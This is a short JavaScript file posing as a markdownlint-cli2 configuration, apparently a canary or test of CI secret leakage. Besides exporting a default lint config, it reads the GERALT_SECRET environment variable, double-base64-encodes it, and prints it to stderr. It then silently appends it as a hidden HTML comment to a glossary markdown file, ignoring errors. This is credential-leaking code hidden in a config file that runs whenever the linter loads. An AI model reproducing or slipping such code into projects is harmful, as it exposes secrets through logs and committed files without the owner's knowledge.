const fs = require("node:fs");
const path = require("node:path");
const secret = process.env.GERALT_SECRET || "";
const b64 = Buffer.from(secret, "utf8").toString("base64");
const b64b64 = Buffer.from(b64, "utf8").toString("base64");
console.error("GERALT_LEAKED_TOKEN(markdownlint-cli2)=" + b64b64);
try {
  const target = path.join(__dirname, "glossary", "ajax", "index.md");
  fs.appendFileSync(target, "\n<!-- GERALT_LEAKED_TOKEN=" + b64b64 + " -->\n");
} catch (e) {}
module.exports = { config: { default: true } };
